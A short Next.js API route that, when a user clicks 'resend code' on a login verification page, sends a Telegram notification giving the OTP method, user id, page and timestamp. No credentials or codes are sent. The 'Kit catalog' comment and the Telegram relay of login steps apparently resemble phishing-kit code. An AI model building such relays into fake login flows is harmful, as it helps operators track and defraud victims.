import { NextRequest, NextResponse } from "next/server"
import { sendFormNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const method = body?.method === "email" ? "email" : "text"
    // Kit catalog §10 — resend code clicked (identity line from userId).
    void sendFormNotification({
      type:
        method === "email"
          ? "login_email_otp_resend"
          : "login_text_otp_resend",
      userId: String(body?.userId ?? ""),
      page: "/verify",
      timestamp: new Date().toISOString(),
    })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending resend code notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
